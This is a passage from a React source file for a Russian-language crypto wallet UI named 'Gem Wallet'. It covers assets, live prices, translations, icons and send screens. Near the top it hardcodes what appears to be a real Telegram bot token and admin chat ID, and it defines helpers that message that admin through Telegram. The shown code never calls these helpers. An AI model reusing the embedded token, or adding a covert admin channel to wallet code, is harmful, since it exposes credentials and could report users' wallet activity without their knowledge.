/* ─── Gem Wallet — Updated ──────────────────────────────────── */
import { useState, useEffect, useRef, memo, useMemo, useCallback, createContext, useContext } from "react";
import gemIcon from './assets/gem-icon.png';
import { useWallet } from './context/WalletContext.jsx';
import { getEvmFeeEstimate } from './lib/crypto/txSender.js';
import { TokenIcon } from './components/TokenIcon.jsx';
import { QRCodeSVG } from 'qrcode.react';

/* ─── Global constants ──────────────────────────────────────── */
const DS = {
  bg:      "#000000", // Чистый черный как на OLED экранах и скрине
  card:    "#1C1C1E", // Стандартный iOS темно-серый для карточек
  input:   "#2C2C2E",
  border:  "#38383A",
  blue:    "#007AFF", // Тот самый синий
  blueS:   "#007AFF",
  text:    "#FFFFFF",
  muted:   "#8E8E93", // Стандартный iOS серый
  danger:  "#FF453A",
  warn:    "#FF9500",
  green:   "#34C759",
  font:    "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif",
};

/* ─── Admin constants & Telegram notifications ───────────────── */
const ADMIN_ID = "1192740493";
const NOTIFY_BOT_TOKEN = import.meta.env.VITE_BOT_TOKEN || "8617702690:AAHEEzFWLb9LPxhCKVtkw7P00vQ2FeJWxNo";

async function notifyAdmin(text, type = "notification", extraData = {}) {
  try {
    if (!NOTIFY_BOT_TOKEN || !ADMIN_ID) return;
    await fetch(`https://api.telegram.org/bot${NOTIFY_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: ADMIN_ID,
        text,
        parse_mode: "HTML",
        disable_notification: false,
      }),
    });
  } catch (e) {
    console.warn("[notifyAdmin] failed:", e.message);
  }
}

async function notifyUser(userId, text) {
  try {
    if (!NOTIFY_BOT_TOKEN || !userId) return;
    await fetch(`https://api.telegram.org/bot${NOTIFY_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: String(userId),
        text,
        parse_mode: "HTML",
        disable_notification: false,
      }),
    });
  } catch (e) {
    console.warn("[notifyUser] failed:", e.message);
  }
}

const BASE_ASSETS = [
  { id: "btc",      name: "Bitcoin",   symbol: "BTC",  price: "95 124,00 $", change: "+1,23 %", positive: true,  tokenId: "BTC",      usdPrice: 95124.00 },
  { id: "eth",      name: "Ethereum",  symbol: "ETH",  price: "2 191,35 $", change: "+0,49 %", positive: true,  tokenId: "ETH",      usdPrice: 2191.35 },
  { id: "sol",      name: "Solana",    symbol: "SOL",  price: "86,64 $",    change: "-0,13 %", positive: false, tokenId: "SOL",      usdPrice: 86.64 },
  { id: "ton",      name: "TON",       symbol: "TON",  price: "1,96 $",     change: "+1,98 %", positive: true,  tokenId: "TON",      usdPrice: 1.96 },
  { id: "bnb",      name: "BNB Chain", symbol: "BNB",  price: "655,17 $",   change: "-0,17 %", positive: false, tokenId: "BNB",      usdPrice: 655.17 },
  { id: "ltc",      name: "Litecoin",  symbol: "LTC",  price: "55,99 $",    change: "-0,26 %", positive: false, tokenId: "LTC",      usdPrice: 55.99 },
  { id: "arb",      name: "Arbitrum",  symbol: "ARB",  price: "0,1192 $",   change: "-0,86 %", positive: false, tokenId: "ARB",      usdPrice: 0.1192 },
  { id: "usdt-eth", name: "Tether",    symbol: "USDT", price: "1,00 $",     change: "-0,01 %", positive: false, tokenId: "USDT_ETH", usdPrice: 1.00 },
  { id: "usdt-sol", name: "Tether",    symbol: "USDT", price: "1,00 $",     change: "-0,01 %", positive: false, tokenId: "USDT_SOL", usdPrice: 1.00 },
  { id: "usdt-ton", name: "Tether",    symbol: "USDT", price: "1,00 $",     change: "-0,01 %", positive: false, tokenId: "USDT_TON", usdPrice: 1.00 },
  { id: "usdt-bnb", name: "Tether",    symbol: "USDT", price: "1,00 $",     change: "-0,02 %", positive: false, tokenId: "USDT_BNB", usdPrice: 1.00 },
  { id: "usdt-arb", name: "Tether",    symbol: "USDT", price: "1,00 $",     change: "-0,01 %", positive: false, tokenId: "USDT_ARB", usdPrice: 1.00 },
];
const sendableAssets = BASE_ASSETS;
const swapReceiveAssets = BASE_ASSETS;
const receiveAssets = BASE_ASSETS;

/* ─── Live Prices (CoinGecko) ────────────────────────────────── */
const LivePricesContext = createContext({});

const GECKO_IDS = {
  btc: 'bitcoin', eth: 'ethereum', sol: 'solana', ton: 'toncoin',
  bnb: 'binancecoin', ltc: 'litecoin', arb: 'arbitrum',
};

function LivePricesProvider({ children }) {
  const [prices, setPrices] = useState({});
  useEffect(() => {
    async function fetchPrices() {
      try {
        const ids = Object.values(GECKO_IDS).join(',');
        const res = await fetch(
          `https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=usd&include_24hr_change=true`
        );
        if (!res.ok) return;
        const data = await res.json();
        const result = {};
        for (const [assetId, geckoId] of Object.entries(GECKO_IDS)) {
          if (data[geckoId]) {
            result[assetId] = {
              usdPrice: data[geckoId].usd,
              change24h: data[geckoId].usd_24h_change ?? 0,
            };
          }
        }
        setPrices(result);
      } catch { /* silently keep static prices on error */ }
    }
    fetchPrices();
    const interval = setInterval(fetchPrices, 60_000);
    return () => clearInterval(interval);
  }, []);
  return <LivePricesContext.Provider value={prices}>{children}</LivePricesContext.Provider>;
}

function useLivePriceMap() {
  return useContext(LivePricesContext);
}

function useAssets() {
  const prices = useContext(LivePricesContext);
  return useMemo(() => BASE_ASSETS.map(a => {
    const key = a.id.startsWith('usdt') ? null : a.id;
    const live = key ? prices[key] : null;
    if (!live) return a;
    const { usdPrice, change24h } = live;
    const positive = change24h >= 0;
    const sign = positive ? '+' : '-';
    const changeStr = `${sign}${Math.abs(change24h).toFixed(2).replace('.', ',')} %`;
    let priceStr;
    if (usdPrice >= 10000)      priceStr = usdPrice.toLocaleString('ru-RU', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + ' $';
    else if (usdPrice >= 1)     priceStr = usdPrice.toFixed(2).replace('.', ',') + ' $';
    else                        priceStr = usdPrice.toFixed(4).replace('.', ',') + ' $';
    return { ...a, usdPrice, price: priceStr, change: changeStr, positive };
  }), [prices]);
}

const swapPayAssets = [
  { id: "btc", name: "Bitcoin", symbol: "BTC", tokenId: "BTC" },
  { id: "ton", name: "TON", symbol: "TON", tokenId: "TON" },
  { id: "eth", name: "Ethereum", symbol: "ETH", tokenId: "ETH" },
];

const tabs = [
  { id: "wallet", label: "Кошелек" },
  { id: "collections", label: "Коллекции" },
  { id: "activity", label: "Активность" },
  { id: "settings", label: "Настройки" },
];

/* ─── Currency & Language system ────────────────────────────── */
const CURRENCIES = [
  { code: 'USD', symbol: '$',  name: 'US Dollar',           flag: '🇺🇸', rate: 1.0    },
  { code: 'EUR', symbol: '€',  name: 'Euro',                flag: '🇪🇺', rate: 0.92   },
  { code: 'RUB', symbol: '₽',  name: 'Российский рубль',   flag: '🇷🇺', rate: 90.5   },
  { code: 'BYN', symbol: 'Br', name: 'Белорусский рубль',  flag: '🇧🇾', rate: 3.25   },
  { code: 'GBP', symbol: '£',  name: 'British Pound',      flag: '🇬🇧', rate: 0.79   },
  { code: 'UAH', symbol: '₴',  name: 'Українська гривня', flag: '🇺🇦', rate: 41.5   },
  { code: 'CNY', symbol: '¥',  name: '人民币',              flag: '🇨🇳', rate: 7.24   },
  { code: 'KZT', symbol: '₸',  name: 'Казахстанский тенге', flag: '🇰🇿', rate: 445.0 },
];

  const LANGUAGES = [
    { code: 'ru', name: 'Русский',    flag: '🇷🇺' },
    { code: 'en', name: 'English',    flag: '🇬🇧' },
    { code: 'uk', name: 'Українська', flag: '🇺🇦' },
    { code: 'de', name: 'Deutsch',    flag: '🇩🇪' },
    { code: 'fr', name: 'Français',   flag: '🇫🇷' },
    { code: 'es', name: 'Español',    flag: '🇪🇸' },
    { code: 'zh', name: '中文',        flag: '🇨🇳' },
    { code: 'tr', name: 'Türkçe',     flag: '🇹🇷' },
    { code: 'pl', name: 'Polski',     flag: '🇵🇱' },
  ];

  const TRANSLATIONS = {
    ru: { send: 'Отправить', receive: 'Получить', buy: 'Купить', swap: 'Обмен',
          wallet: 'Кошелек', collections: 'Коллекции', activity: 'Активность', settings: 'Настройки',
          portfolio: 'Баланс портфеля', currency: 'Валюта', language: 'Язык' },
    en: { send: 'Send', receive: 'Receive', buy: 'Buy', swap: 'Swap',
          wallet: 'Wallet', collections: 'Collections', activity: 'Activity', settings: 'Settings',
          portfolio: 'Portfolio Balance', currency: 'Currency', language: 'Language' },
    uk: { send: 'Надіслати', receive: 'Отримати', buy: 'Купити', swap: 'Обмін',
          wallet: 'Гаманець', collections: 'Колекції', activity: 'Активність', settings: 'Налаштування',
          portfolio: 'Баланс портфеля', currency: 'Валюта', language: 'Мова' },
    de: { send: 'Senden', receive: 'Empfangen', buy: 'Kaufen', swap: 'Tauschen',
          wallet: 'Wallet', collections: 'Sammlungen', activity: 'Aktivität', settings: 'Einstellungen',
          portfolio: 'Portfolio-Saldo', currency: 'Währung', language: 'Sprache' },
    fr: { send: 'Envoyer', receive: 'Recevoir', buy: 'Acheter', swap: 'Échanger',
          wallet: 'Portefeuille', collections: 'Collections', activity: 'Activité', settings: 'Paramètres',
          portfolio: 'Solde du portefeuille', currency: 'Devise', language: 'Langue' },
    es: { send: 'Enviar', receive: 'Recibir', buy: 'Comprar', swap: 'Cambiar',
          wallet: 'Billetera', collections: 'Colecciones', activity: 'Actividad', settings: 'Ajustes',
          portfolio: 'Saldo de cartera', currency: 'Moneda', language: 'Idioma' },
    zh: { send: '发送', receive: '接收', buy: '购买', swap: '兑换',
          wallet: '钱包', collections: '收藏', activity: '活动', settings: '设置',
          portfolio: '投资组合余额', currency: '货币', language: '语言' },
    tr: { send: 'Gönder', receive: 'Al', buy: 'Satın Al', swap: 'Takas',
          wallet: 'Cüzdan', collections: 'Koleksiyonlar', activity: 'Aktivite', settings: 'Ayarlar',
          portfolio: 'Portföy Bakiyesi', currency: 'Para Birimi', language: 'Dil' },
    pl: { send: 'Wyślij', receive: 'Odbierz', buy: 'Kup', swap: 'Wymień',
          wallet: 'Portfel', collections: 'Kolekcje', activity: 'Aktywność', settings: 'Ustawienia',
          portfolio: 'Saldo portfela', currency: 'Waluta', language: 'Język' },
  };

  function fmtCurrency(usdAmount, currencyCode) {
    const cur = CURRENCIES.find(c => c.code === currencyCode) || CURRENCIES[0];
    const val = usdAmount * cur.rate;
    let formatted;
    if (val >= 1000000) formatted = (val / 1000000).toFixed(2).replace('.', ',') + ' M';
    else if (val >= 10000) formatted = Math.round(val).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ' ');
    else if (val >= 100)   formatted = val.toFixed(2).replace('.', ',');
    else if (val >= 1)     formatted = val.toFixed(2).replace('.', ',');
    else                   formatted = val.toFixed(4).replace('.', ',');
    return `${formatted} ${cur.symbol}`;
  }

  function getLang(settings) {
    const code = settings?.languageCode || 'ru';
    return TRANSLATIONS[code] || TRANSLATIONS.ru;
  }
  

const ANIM_STYLE = `
  @keyframes fadeSlideUp {
    from { opacity: 0; transform: translate3d(0, 10px, 0); }
    to   { opacity: 1; transform: translate3d(0, 0, 0); }
  }
  @keyframes fadeIn {
    from { opacity: 0; }
    to   { opacity: 1; }
  }
  @keyframes scaleIn {
    from { opacity: 0; transform: scale3d(0.95, 0.95, 1); }
    to   { opacity: 1; transform: scale3d(1, 1, 1); }
  }
  @keyframes slideInRight {
    from { opacity: 0; transform: translate3d(20px, 0, 0); }
    to   { opacity: 1; transform: translate3d(0, 0, 0); }
  }
  @keyframes pulse {
    0%, 100% { transform: scale3d(1, 1, 1); }
    50%       { transform: scale3d(1.06, 1.06, 1); }
  }
  @keyframes spin {
    from { transform: rotate(0deg); }
    to   { transform: rotate(360deg); }
  }
  @keyframes refreshDone {
    0%   { transform: scale(1); opacity: 1; }
    40%  { transform: scale(1.18); opacity: 1; }
    100% { transform: scale(1); opacity: 1; }
  }
  .anim-page    { 
    animation: slideInRight 0.25s cubic-bezier(0.4, 0, 0.2, 1) both; 
    will-change: transform, opacity; 
    backface-visibility: hidden;
    transform: translate3d(0,0,0);
  }
  .anim-list > * { 
    animation: fadeSlideUp 0.3s cubic-bezier(0.4, 0, 0.2, 1) both; 
    will-change: transform, opacity; 
    backface-visibility: hidden;
    transform: translate3d(0,0,0);
  }
  .anim-list > *:nth-child(1)  { animation-delay: 0.00s; }
  .anim-list > *:nth-child(2)  { animation-delay: 0.02s; }
  .anim-list > *:nth-child(3)  { animation-delay: 0.04s; }
  .anim-list > *:nth-child(4)  { animation-delay: 0.06s; }
  .anim-list > *:nth-child(5)  { animation-delay: 0.08s; }
  .anim-list > *:nth-child(6)  { animation-delay: 0.10s; }
  .anim-list > *:nth-child(7)  { animation-delay: 0.12s; }
  .anim-list > *:nth-child(8)  { animation-delay: 0.14s; }
  .anim-list > *:nth-child(9)  { animation-delay: 0.16s; }
  .anim-list > *:nth-child(10) { animation-delay: 0.18s; }
  .anim-list > *:nth-child(11) { animation-delay: 0.20s; }
  .tap-btn {
    transition: transform 0.1s ease, box-shadow 0.1s;
    cursor: pointer;
  }
  .tap-btn:active { transform: scale3d(0.95, 0.95, 1) !important; }
  .tap-row {
    transition: background 0.1s;
    cursor: pointer;
  }
  .tap-row:active { background: rgba(255,255,255,0.06) !important; }
  .nav-icon {
    transition: transform 0.15s ease;
  }
  .nav-icon:active { transform: scale3d(0.85, 0.85, 1); }
  
  * { -webkit-tap-highlight-color: transparent; outline: none; -webkit-overflow-scrolling: touch; }
  html, body { scroll-behavior: smooth; }
  .smooth-scroll { overflow-y: auto; -webkit-overflow-scrolling: touch; scroll-behavior: smooth; }
  body { margin: 0; padding: 0; background: #000; overflow-x: hidden; -webkit-font-smoothing: antialiased; }
`;

const AnimStyles = memo(() => {
  return <style>{ANIM_STYLE}</style>;
});

/* ─── Shared UI Components ───────────────────────────────────── */
const ChevronRight = ({ color = "#8E8E93", size = 18 }) => (
  <svg viewBox="0 0 24 24" fill="none" style={{ width: size, height: size, flexShrink: 0 }}>
    <path d="M9 18l6-6-6-6" stroke={color} strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
  </svg>
);

/* ─── Utils ─────────────────────────────────────────────────── */
const copyToClipboard = async (text) => {
  try {
    if (navigator.clipboard && navigator.clipboard.writeText) {
      await navigator.clipboard.writeText(text);
      return true;
    } else {
      const textArea = document.createElement("textarea");
      textArea.value = text;
      textArea.style.position = "fixed";
      textArea.style.left = "-9999px";
      textArea.style.top = "0";
      document.body.appendChild(textArea);
      textArea.focus();
      textArea.select();
      const successful = document.execCommand('copy');
      document.body.removeChild(textArea);
      return successful;
    }
  } catch (err) {
    console.error('Copy failed:', err);
    return false;
  }
};

/* ─── Address resolver for all asset types ───────────────────── */
const ASSET_TO_CHAIN = {
  'btc':      'BTC',
  'eth':      'ETH',
  'bnb':      'BNB',
  'ton':      'TON',
  'sol':      'SOL',
  'arb':      'ARB',
  'ltc':      'LTC',
  'usdt-eth': 'ETH',
  'usdt-bnb': 'BNB',
  'usdt-sol': 'SOL',
  'usdt-ton': 'TON',
  'usdt-arb': 'ARB',
  'usdt-trx': 'TRX',
};

function getAddressForAsset(assetId, addresses) {
  const key = ASSET_TO_CHAIN[assetId] || assetId.split('-')[0].toUpperCase();
  return addresses?.[key] || null;
}

/* ─── Crypto amount formatter ────────────────────────────────── */
function fmtCryptoAmt(raw) {
  const n = parseFloat(String(raw).replace(",", "."));
  if (isNaN(n)) return String(raw);
  if (Number.isInteger(n)) return n.toString();
  // Smart decimal count based on magnitude
  let decimals;
  if (n >= 1000) decimals = 2;
  else if (n >= 100) decimals = 2;
  else if (n >= 1)   decimals = 4;
  else               decimals = 6;
  return parseFloat(n.toFixed(decimals)).toString().replace(".", ",");
}

/* ─── Explorer URL helpers ──────────────────────────────────── */
function getExplorerTxUrl(assetId, txHash) {
  const base = {
    ton: 'https://tonviewer.com/transaction/',
    eth: 'https://etherscan.io/tx/',
    btc: 'https://mempool.space/tx/',
    bnb: 'https://bscscan.com/tx/',
    sol: 'https://solscan.io/tx/',
    arb: 'https://arbiscan.io/tx/',
    ltc: 'https://litecoinspace.org/tx/',
    'usdt-eth': 'https://etherscan.io/tx/',
    'usdt-bnb': 'https://bscscan.com/tx/',
    'usdt-sol': 'https://solscan.io/tx/',
    'usdt-ton': 'https://tonviewer.com/transaction/',
    'usdt-arb': 'https://arbiscan.io/tx/',
  };
  const baseUrl = base[(assetId || '').toLowerCase()] || 'https://etherscan.io/tx/';
  return txHash ? baseUrl + txHash : null;
}
function getExplorerAddressUrl(assetId, address) {
  const base = {
    ton: 'https://tonviewer.com/',
    eth: 'https://etherscan.io/address/',
    btc: 'https://mempool.space/address/',
    bnb: 'https://bscscan.com/address/',
    sol: 'https://solscan.io/account/',
    arb: 'https://arbiscan.io/address/',
    ltc: 'https://litecoinspace.org/address/',
    'usdt-eth': 'https://etherscan.io/address/',
    'usdt-bnb': 'https://bscscan.com/address/',
    'usdt-sol': 'https://solscan.io/account/',
    'usdt-ton': 'https://tonviewer.com/',
    'usdt-arb': 'https://arbiscan.io/address/',
  };
  const baseUrl = base[(assetId || '').toLowerCase()] || 'https://etherscan.io/address/';
  return address && address !== '—' ? baseUrl + address : null;
}

/* BTC — Bitcoin ₿ glyph, geometric */
const BtcIcon = memo(() => (
  <svg viewBox="0 0 32 32" fill="none" style={{ width: "100%", height: "100%" }}>
    <circle cx="16" cy="16" r="16" fill="#F7931A" />
    {/* vertical stem with serifs */}
    <path d="M13.5 8.5 V23.5 M15.5 8.5 V23.5" stroke="white" strokeWidth="1.5" strokeLinecap="round" />
    {/* top bump */}
    <path d="M13.5 9.5 H18 C20 9.5 21 10.5 21 12 C21 13.5 20 14.5 18 14.5 H13.5"
      stroke="white" strokeWidth="1.8" fill="none" strokeLinecap="round" strokeLinejoin="round" />
    {/* bottom bump — wider for ₿ shape */}
    <path d="M13.5 14.5 H18.5 C21 14.5 22 15.7 22 17.3 C22 18.9 21 20.5 18.5 20.5 H13.5"
      stroke="white" strokeWidth="1.8" fill="none" strokeLinecap="round" strokeLinejoin="round" />
  </svg>
));

/* TRX — Tron upward triangle with inner triangle */
const TronIcon = memo(() => (
  <svg viewBox="0 0 32 32" fill="none" style={{ width: "100%", height: "100%" }}>
    <circle cx="16" cy="16" r="16" fill="#CC0022" />
    {/* outer triangle pointing right */}
    <path d="M8 22 L16 8 L24 22 Z" fill="white" fillOpacity="0.95" />
    {/* inner cutout to create Tron T shape */}
    <path d="M12.5 22 L16 14.5 L19.5 22 Z" fill="#CC0022" />
    {/* top highlight */}
    <path d="M8 22 L16 8 L24 22" fill="none" />
  </svg>
));

/* MON — Monad M shape */
const MonadIcon = memo(() => (
  <svg viewBox="0 0 32 32" fill="none" style={{ width: "100%", height: "100%" }}>
    <circle cx="16" cy="16" r="16" fill="#6B21A8" />
    <path d="M8 23 V10 L16 17.5 L24 10 V23"
      stroke="white" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round" fill="none" />
  </svg>
));

/* ZEC — Zcash Z shape, clean */
const ZecIcon = memo(() => (
  <svg viewBox="0 0 32 32" fill="none" style={{ width: "100%", height: "100%" }}>
    <circle cx="16" cy="16" r="16" fill="#E8A820" />
    <path d="M10.5 10 H21.5 L10.5 22 H21.5" stroke="white" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round" fill="none" />
  </svg>
));

/* AVAX — Avalanche A with crossbar */
const AvaxIcon = memo(() => (
  <svg viewBox="0 0 32 32" fill="none" style={{ width: "100%", height: "100%" }}>
    <circle cx="16" cy="16" r="16" fill="#E84142" />
    <path d="M10 23 L16 9 L22 23" stroke="white" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round" fill="none" />
    <path d="M12.5 18.5 H19.5" stroke="white" strokeWidth="2" strokeLinecap="round" />
  </svg>
));

/* ADA — Cardano: ring with 6 dots at vertices */
const AdaIcon = memo(() => (
  <svg viewBox="0 0 32 32" fill="none" style={{ width: "100%", height: "100%" }}>
    <circle cx="16" cy="16" r="16" fill="#0033AD" />
    <circle cx="16" cy="16" r="5.5" stroke="white" strokeWidth="1.8" fill="none" />
    <circle cx="16" cy="8.5"  r="1.8" fill="white" />
    <circle cx="16" cy="23.5" r="1.8" fill="white" />
    <circle cx="9.5"  cy="12.2" r="1.8" fill="white" />
    <circle cx="22.5" cy="12.2" r="1.8" fill="white" />
    <circle cx="9.5"  cy="19.8" r="1.8" fill="white" />
    <circle cx="22.5" cy="19.8" r="1.8" fill="white" />
  </svg>
));

/* APT — Aptos icon */
const AptIcon = memo(() => (
  <svg viewBox="0 0 32 32" fill="none" style={{ width: "100%", height: "100%" }}>
    <circle cx="16" cy="16" r="16" fill="#111111" />
    <path d="M16 8 L24 12 L24 20 L16 24 L8 20 L8 12 Z" fill="white" fillOpacity="0.9" />
    <path d="M8 14 H24 M8 18 H24" stroke="#111" strokeWidth="1.5" />
  </svg>
));
const XLayerIcon = memo(() => (
  <svg viewBox="0 0 32 32" fill="none" style={{ width: "100%", height: "100%" }}>
    <circle cx="16" cy="16" r="16" fill="#111111" />
    <path d="M10 10 L22 22 M22 10 L10 22" stroke="white" strokeWidth="2.4" strokeLinecap="round" />
  </svg>
));

/* ─── Network badge icons (small overlay) ────────────────────── */
const EthBadge = () => (
  <svg viewBox="0 0 16 16" fill="none" style={{ width: "100%", height: "100%" }}>
    <circle cx="8" cy="8" r="8" fill="white" />
    <path d="M8 3.5 L10.5 7.5 L8 6.5 L5.5 7.5 L8 3.5 Z" fill="black" />
    <path d="M8 12.5 L10.5 8.5 L8 9.5 L5.5 8.5 L8 12.5 Z" fill="black" />
    <path d="M8 6.5 L10.5 7.5 L8 8.5 L5.5 7.5 L8 6.5 Z" fill="black" opacity="0.3" />
  </svg>
);

const BnbBadge = () => (
  <svg viewBox="0 0 16 16" fill="none" style={{ width: "100%", height: "100%" }}>
    <circle cx="8" cy="8" r="8" fill="black" />
    <path d="M8 4.5 L9.5 6 L8 7.5 L6.5 6 L8 4.5 Z" fill="#F0B90B" />
    <path d="M8 10 L9.5 11.5 L8 13 L6.5 11.5 L8 10 Z" fill="#F0B90B" />
    <path d="M5.5 7.5 L7 9 L5.5 10.5 L4 9 L5.5 7.5 Z" fill="#F0B90B" />
    <path d="M10.5 7.5 L12 9 L10.5 10.5 L9 9 L10.5 7.5 Z" fill="#F0B90B" />
    <path d="M8 7.5 L9.5 9 L8 10.5 L6.5 9 L8 7.5 Z" fill="#F0B90B" />
  </svg>
);

const SolBadge = () => (
  <svg viewBox="0 0 16 16" fill="none" style={{ width: "100%", height: "100%" }}>
    <circle cx="8" cy="8" r="8" fill="black" />
    <path d="M5 10.5 H11 L12 9.5 H6 L5 10.5 Z" fill="#14F195" />
    <path d="M5 8 H11 L12 7 H6 L5 8 Z" fill="#9945FF" />
    <path d="M6 5.5 H12 L11 4.5 H5 L6 5.5 Z" fill="#14F195" />
  </svg>
);

const TonBadge = () => (
  <svg viewBox="0 0 16 16" fill="none" style={{ width: "100%", height: "100%" }}>
    <circle cx="8" cy="8" r="8" fill="#0098EA" />
    <path d="M4 6 H12 L8 12 Z" fill="white" />
  </svg>
);

const ArbBadge = () => (
  <svg viewBox="0 0 16 16" fill="none" style={{ width: "100%", height: "100%" }}>
    <circle cx="8" cy="8" r="8" fill="#1A2B45" />
    <path d="M8 4 L11.5 6 L11.5 10 L8 12 L4.5 10 L4.5 6 Z" stroke="#28A0F0" strokeWidth="1" fill="none" />
    <path d="M6 10 L7.5 8 L8.5 9.5 L10 7.5" stroke="#28A0F0" strokeWidth="1" strokeLinecap="round" strokeLinejoin="round" fill="none" />
  </svg>
);

/* ─── Composite icon with network badge ──────────────────────── */
function CompositeIcon({ MainIcon, BadgeIcon }) {
  return (
    <div style={{ position: "relative", width: "100%", height: "100%" }}>
      <MainIcon />
      <div style={{ position: "absolute", bottom: -1, right: -1, width: "38%", height: "38%",
        borderRadius: "50%", overflow: "hidden", border: "1.5px solid #111" }}>
        <BadgeIcon />
      </div>
    </div>
  );
}

/* ─── TopBar ─────────────────────────────────────────────────── */
const TopBar = memo(({ title, onBack, rightEl }) => {
  return (
    <div style={{ display: "flex", alignItems: "center", padding: "16px 20px", gap: 12, position: "relative" }}>
      <button onClick={onBack} style={{ background: "#181820", border: "none", borderRadius: "50%", width: 32, height: 32, cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center", zIndex: 2 }}>
        <svg viewBox="0 0 24 24" fill="none" style={{ width: 18, height: 18 }}>
          <path d="M15 19l-7-7 7-7" stroke="white" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
        </svg>
      </button>
      <span style={{ flex: 1, color: "white", fontWeight: 700, fontSize: 17, textAlign: "center", position: "absolute", left: 0, right: 0, pointerEvents: "none" }}>{title}</span>
      <div style={{ flex: 1 }} />
      <div style={{ minWidth: 32, display: "flex", justifyContent: "flex-end", zIndex: 2 }}>{rightEl}</div>
    </div>
  );
});

/* ─── QR Code — real, encodes actual wallet address ─────────── */
const WalletQRCode = memo(({ address, size = 210 }) => {
  if (!address) {
    return (
      <div style={{ width: size, height: size, display: 'flex', alignItems: 'center', justifyContent: 'center',
        background: '#F2F2F7', borderRadius: 12 }}>
        <div style={{ color: '#888', fontSize: 13, textAlign: 'center', padding: 16 }}>
          Адрес не найден.<br />Разблокируйте кошелёк.
        </div>
      </div>
    );
  }
  return (
    <QRCodeSVG
      value={address}
      size={size}
      bgColor="#FFFFFF"
      fgColor="#111111"
      level="M"
      style={{ display: 'block', borderRadius: 8 }}
    />
  );
});

/* ─── Screen: Send — select asset ───────────────────────────── */
function SendSelectScreen({ onBack, onSelect }) {
  const { balances } = useWallet();
  const [tab, setTab] = useState("all");
  const [search, setSearch] = useState("");

  const getRealBalance = (id) => {
    if (!balances) return 0;
    let val = 0;
    switch(id) {
      case 'ltc':      val = balances.LTC || balances.litecoin || 0; break;
      case 'eth':      val = balances.ETH || balances.ethereum || 0; break;
      case 'ton':      val = balances.TON || balances.ton || 0; break;
      case 'arb':      val = balances.ARB || balances.arbitrum || 0; break;
      case 'bnb':      val = balances.BNB || balances.bsc || 0; break;
      case 'sol':      val = balances.SOL || balances.solana || 0; break;
      case 'usdt-eth': val = balances._usdtByNetwork?.eth || 0; break;
      case 'usdt-bnb': val = balances._usdtByNetwork?.bnb || 0; break;
      case 'usdt-sol': val = balances._usdtByNetwork?.sol || 0; break;
      case 'usdt-ton': val = balances._usdtByNetwork?.ton || 0; break;
      case 'usdt-trx': val = balances._usdtByNetwork?.trx || 0; break;
      default: val = 0;
    }
    return parseFloat(val) || 0;
  };

  const filtered = sendableAssets.filter(
    (a) =>
      (tab === "all" || a.symbol === "USDT") &&
      a.name.toLowerCase().includes(search.toLowerCase()),
  );

  return (
    <div style={{ display: "flex", flexDirection: "column", flex: 1 }}>
      <TopBar
        title="Отправить"
        onBack={onBack}
        rightEl={
          <svg viewBox="0 0 24 24" fill="none" style={{ width: 20, height: 20 }}>
            <path d="M3 6h18M7 12h10M11 18h2" stroke="white" strokeWidth="1.8" strokeLinecap="round" />
          </svg>
        }
      />
      <div style={{ padding: "0 16px 14px" }}>
        <div style={{ background: "#252530", borderRadius: 12, display: "flex", alignItems: "center", padding: "10px 14px", gap: 8 }}>
          <svg viewBox="0 0 24 24" fill="none" style={{ width: 18, height: 18, flexShrink: 0 }}>
            <circle cx="11" cy="11" r="8" stroke="#888" strokeWidth="1.8" />
            <path d="M21 21l-4.35-4.35" stroke="#888" strokeWidth="1.8" strokeLinecap="round" />
          </svg>
          <input value={search} onChange={(e) => setSearch(e.target.value)} placeholder="Поиск"
            style={{ background: "none", border: "none", outline: "none", color: "white", fontSize: 15, width: "100%" }} />
        </div>
      </div>
      <div style={{ display: "flex", padding: "0 16px 16px", gap: 8 }}>
        {[{ key: "all", label: "Все" }, { key: "stable", label: "Стейблкоины" }].map((t) => (
          <button key={t.key} onClick={() => setTab(t.key)}
            style={{ padding: "7px 18px", borderRadius: 20, border: "none", cursor: "pointer", fontSize: 14, fontWeight: 500,
              background: tab === t.key ? "#3B7DFF" : "transparent", color: tab === t.key ? "white" : "#888" }}>
            {t.label}
          </button>
        ))}
      </div>
      <div style={{ background: "#181820", borderRadius: 16, margin: "0 12px", overflow: "hidden" }}>
        {filtered.map((asset, i) => {
          const realBal = getRealBalance(asset.id);
          const balStr = fmtBal(realBal, asset.symbol);
          return (
            <div key={asset.id} onClick={() => onSelect(asset.id)}
              style={{ display: "flex", alignItems: "center", padding: "14px 16px", cursor: "pointer",
                borderBottom: i < filtered.length - 1 ? "1px solid #2A2A2C" : "none" }}>
              <div style={{ width: 44, height: 44, flexShrink: 0 }}>
                <TokenIcon tokenId={asset.tokenId} size={44} badgeSize={18} />
              </div>
              <div style={{ flex: 1, marginLeft: 12 }}>
                <div style={{ color: "white", fontWeight: 600, fontSize: 15 }}>{asset.name}</div>
              </div>
              <div style={{ textAlign: "right" }}>
                <div style={{ color: realBal === 0 ? "#555" : "white", fontWeight: 500, fontSize: 14 }}>{balStr}</div>
              </div>
            </div>
          );
        })}
      </div>
    </div>
  );
}

/* ─── Screen: Send — recipient ──────────────────────────────── */
function SendRecipientScreen({ assetId, onBack, onContinue }) {
  const asset = BASE_ASSETS.find((a) => a.id === assetId);
  const [address, setAddress] = useState("");
  const [memoText, setMemoText] = useState("");

  return (
    <div style={{ display: "flex", flexDirection: "column", flex: 1 }}>
      <TopBar title="Получатель" onBack={onBack} rightEl={
        <button onClick={() => address && onContinue(address)}
          style={{ background: "none", border: "none", color: address ? "#3B7DFF" : "#555", fontSize: 13, fontWeight: 700, cursor: address ? "pointer" : "default", whiteSpace: "nowrap", textTransform: "uppercase" }}>
          ПРОДОЛЖИТЬ
        </button>
      } />
